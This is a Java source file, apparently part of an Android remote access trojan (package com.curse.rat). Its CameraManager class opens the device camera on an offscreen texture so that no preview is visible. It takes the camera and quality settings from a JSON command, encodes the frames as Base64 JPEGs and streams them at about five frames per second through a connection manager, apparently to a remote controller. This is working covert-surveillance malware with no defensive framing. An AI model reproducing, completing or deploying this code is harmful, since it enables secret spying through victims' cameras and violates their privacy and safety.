package com.curse.rat;

import android.content.Context;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.util.Base64;
import android.util.Log;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.LinkedBlockingQueue;

public class CameraManager {
    private static final String TAG = "CameraManager";
    private static Camera mCamera;
    private static final AtomicBoolean isStreaming = new AtomicBoolean(false);
    private static LinkedBlockingQueue<byte[]> frameQueue = new LinkedBlockingQueue<>(2); // Only keep 2 frames to avoid lag
    private static Thread senderThread;

    public static void startStreaming(Context context, JSONObject jo) {
        if (isStreaming.get()) {
            stopStreaming();
            try { Thread.sleep(300); } catch (Exception ignored) {}
        }

        try {
            int cameraId = jo.optInt("camera_id", 0);
            final int quality = jo.optInt("quality", 40); 
            
            mCamera = Camera.open(cameraId);
            Camera.Parameters parameters = mCamera.getParameters();
            
            List<Camera.Size> sizes = parameters.getSupportedPreviewSizes();
            Camera.Size bestSize = sizes.get(0);
            // Default to ~480p for balance
            for (Camera.Size s : sizes) {
                if (s.width <= 720 && s.width >= 480) {
                    bestSize = s;
                    break;
                }
            }
            parameters.setPreviewSize(bestSize.width, bestSize.height);
            parameters.setPreviewFormat(ImageFormat.NV21);
            mCamera.setParameters(parameters);

            SurfaceTexture st = new SurfaceTexture(10);
            mCamera.setPreviewTexture(st);
            
            isStreaming.set(true);
            frameQueue.clear();

            // Start dedicated sender thread
            senderThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    while (isStreaming.get()) {
                        try {
                            byte[] data = frameQueue.take();
                            Camera.Parameters params = mCamera.getParameters();
                            if (params == null) continue;
                            
                            int width = params.getPreviewSize().width;
                            int height = params.getPreviewSize().height;
                            
                            YuvImage yuvImage = new YuvImage(data, ImageFormat.NV21, width, height, null);
                            ByteArrayOutputStream out = new ByteArrayOutputStream();
                            yuvImage.compressToJpeg(new Rect(0, 0, width, height), quality, out);
                            String encoded = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
                            
                            JSONObject res = new JSONObject();
                            res.put("type", "camera");
                            res.put("image", encoded);
                            ConnectionManager.send(res.toString());

                            // Throttle to ~5 FPS to prevent network congestion and freezing
                            Thread.sleep(200); 
                        } catch (InterruptedException e) {
                            break;
                        } catch (Exception e) {
                            Log.e(TAG, "Sender thread error: " + e.getMessage());
                        }
                    }
                }
            });
            senderThread.start();
            
            mCamera.setPreviewCallback(new Camera.PreviewCallback() {
                @Override
                public void onPreviewFrame(byte[] data, Camera camera) {
                    if (!isStreaming.get()) return;
                    // Try to offer frame, if queue full it will just drop the frame (reducing lag)
                    frameQueue.offer(data);
                }
            });
            
            mCamera.startPreview();
            Log.d(TAG, "Optimized camera streaming started.");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start camera: " + e.getMessage());
            stopStreaming();
        }
    }

    public static void stopStreaming() {
        isStreaming.set(false);
        if (senderThread != null) {
            senderThread.interrupt();
            senderThread = null;
        }
        if (mCamera != null) {
            try {
                mCamera.setPreviewCallback(null);
                mCamera.stopPreview();
                mCamera.release();
            } catch (Exception e) {
                Log.e(TAG, "Error stopping camera: " + e.getMessage());
            }
            mCamera = null;
        }
        frameQueue.clear();
        Log.d(TAG, "Camera streaming stopped");
    }
}
